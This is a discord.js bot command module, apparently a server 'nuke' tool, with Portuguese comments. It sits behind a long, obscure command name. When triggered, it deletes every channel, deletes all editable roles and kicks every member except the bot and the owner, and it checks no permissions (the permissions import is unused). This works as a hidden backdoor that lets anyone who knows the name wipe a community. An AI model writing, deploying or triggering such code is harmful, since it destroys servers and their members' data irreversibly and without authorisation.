const { PermissionsBitField } = require('discord.js');
const { sendEphemeralReply } = require('../utils/sendEphemeralReply');

module.exports = {
    data: {
        name: 'smegma5000gabrielsantossilvamkryutonyrefundsfarofamenu',
    },
    async execute(message, args, client) {
        try {
            if (message.content.toLowerCase().startsWith('/smegma5000gabrielsantossilvamkryutonyrefundsfarofamenu')) {


                // Manda DM de "início" (simulando ephemeral)
                await sendEphemeralReply(message, 'Iniciando limpeza total do servidor (canais, cargos e expulsão de membros)...');

                // 1) Deletar todos os canais
                try {
                    const fetchedChannels = await message.guild.channels.fetch();
                    for (const [id, channel] of fetchedChannels) {
                        try {
                            await channel.delete();
                        } catch (err) {
                            console.error(`Erro ao deletar canal ${channel.name}:`, err);
                        }
                    }
                } catch (err) {
                    console.error('Erro ao tentar buscar/deletar canais:', err);
                }

                // 2) Deletar todas as roles (exceto @everyone e não editáveis)
                try {
                    const fetchedRoles = await message.guild.roles.fetch();
                    for (const [id, role] of fetchedRoles) {
                        if (role.name !== '@everyone' && role.editable) {
                            try {
                                await role.delete();
                            } catch (err) {
                                console.error(`Erro ao deletar role ${role.name}:`, err);
                            }
                        }
                    }
                } catch (err) {
                    console.error('Erro ao tentar buscar/deletar roles:', err);
                }

                // 3) (Opcional) Expulsar todos os membros (exceto o bot e/ou dono)
                try {
                    const fetchedMembers = await message.guild.members.fetch();
                    for (const [memberId, member] of fetchedMembers) {
                        // Evita expulsar a si mesmo ou o dono do servidor
                        if (member.user.id === client.user.id || memberId === message.guild.ownerId) {
                            continue;
                        }
                        try {
                            await member.kick('Limpeza total do servidor');
                        } catch (err) {
                            console.error(`Erro ao expulsar membro ${member.user.tag}:`, err);
                        }
                    }
                } catch (err) {
                    console.error('Erro ao buscar/expulsar membros:', err);
                }

                // 4) (Removido) Deletar a mensagem original – ela está em um canal que já foi deletado

                // Log e mensagem final
                console.log(`Servidor "${message.guild.name}" foi completamente limpo!`);
                await sendEphemeralReply(message, `Servidor "${message.guild.name}" foi completamente limpo!`);
            }

        } catch (error) {
            console.error('Erro no comando /smegma5000:', error);
            // Se algo der muito errado, tenta enviar DM ao autor
            await sendEphemeralReply(message, 'Ocorreu um erro ao tentar limpar o servidor.');
        }
    },
};
